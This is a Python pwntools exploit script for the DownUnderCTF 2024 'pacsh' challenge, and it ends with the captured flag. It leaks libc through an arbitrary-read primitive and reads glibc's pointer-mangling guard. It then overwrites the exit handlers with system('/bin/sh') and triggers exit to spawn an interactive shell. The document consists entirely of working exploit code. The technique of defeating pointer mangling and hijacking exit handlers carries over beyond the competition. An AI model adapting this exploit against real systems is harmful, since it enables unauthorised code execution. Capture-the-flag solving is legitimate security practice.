#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or 'pacsh', checksec=True)
libc = exe.libc
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]

gdbscript = '''
tbreak main
b write64
b ls
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or '2024.ductf.dev'
    port = int(args.PORT or 30027)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr


def recv_ptr():
    return int(rl().decode().split(': ')[-1], 16)

rl()

exe.address = 0x5500000000

_help = recv_ptr()
_ls = recv_ptr()
_read = recv_ptr()
_write = recv_ptr()


def rd(addr):
    sla(b'pacsh> ', hex(_read).encode())
    sla(b'read64> ', hex(addr).encode())

def wr(addr, val):
    sla(b'pacsh> ', hex(_write).encode())
    sla(b'write64> ', f'{addr:#x} {val:#x}'.encode())
    

def ls():
    sla(b'pacsh> ', hex(_ls).encode())

def help():
    sla(b'pacsh> ', hex(_help).encode())


info(f'{_help:#x} {_ls:#x} {_read:#x} {_write:#x}')


rd(exe.got.system)
libc_leak = int(rl(), 16)
success(f'libc_leak = {libc_leak:#x}')
libc.address = libc_leak - libc.sym.system # -0x94d94
success(f'libc.address = {libc.address:#x}')

info('read mangle secret')
rd(libc.address - 0x134b0) # __pointer_chk_guard
mangle_secret = int(rl(), 16)
success(f'mangle_secret = {mangle_secret:#x}')

binsh = next(libc.search(b'/bin/sh\x00'))
success(f'binsh = {binsh:#x}')

info('set exit handlers')
# on ARM mangle is just xor
wr(libc.sym.initial+ 0x18, libc.sym.system ^ mangle_secret)
wr(libc.sym.initial+ 0x18+8, binsh)

info('change ls to exit')
wr(exe.sym.BUILTINS+0x18, libc.sym.exit)

info('trigger exit')
help()
recv_ptr()
_exit = recv_ptr()
sla(b'pacsh> ', hex(_exit).encode())

ia()


# GNU C Library (Ubuntu GLIBC 2.35-0ubuntu1) stable release version 2.35.

# DUCTF{did_you_just_bruteforce_the_pac?:(}
